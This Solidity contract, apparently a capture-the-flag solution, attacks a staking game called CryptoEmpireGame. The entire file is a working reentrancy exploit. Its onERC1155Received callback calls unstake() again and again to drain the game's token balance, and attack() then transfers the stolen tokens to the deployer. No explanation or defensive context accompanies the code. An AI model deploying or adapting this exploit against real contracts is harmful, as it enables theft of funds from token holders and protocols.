// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import "./CryptoEmpireGame.sol";
import "hardhat/console.sol";

contract AttackCryptoEmpireGame {
    CryptoEmpireGame private cryptoEmpireGame;
    IERC1155 private cryptoEmpireToken;
    address private owner;
    uint256 immutable cryptoEmpireTokenbalance;

    constructor(address _cryptoEmpireToken, address _cryptoEmpireGame) {
        cryptoEmpireGame = CryptoEmpireGame(_cryptoEmpireGame);
        cryptoEmpireToken = IERC1155(_cryptoEmpireToken);
        owner = msg.sender;
        cryptoEmpireToken.setApprovalForAll(address(cryptoEmpireGame), true);
        cryptoEmpireTokenbalance = cryptoEmpireToken.balanceOf(address(cryptoEmpireGame), 2);
    }

    function attack() external {
        require(msg.sender == owner, "only owner");

        cryptoEmpireGame.stake(2);
        cryptoEmpireGame.unstake(2);

        cryptoEmpireToken.safeTransferFrom(address(this), owner, 2, cryptoEmpireToken.balanceOf(address(this), 2), "");
    }

    function onERC1155Received(address, address from, uint256, uint256, bytes calldata) external returns (bytes4) {
        if (cryptoEmpireToken.balanceOf(address(this), 2) <= cryptoEmpireTokenbalance && from != owner) {
            cryptoEmpireGame.unstake(2);
        }
        return this.onERC1155Received.selector;
    }
}
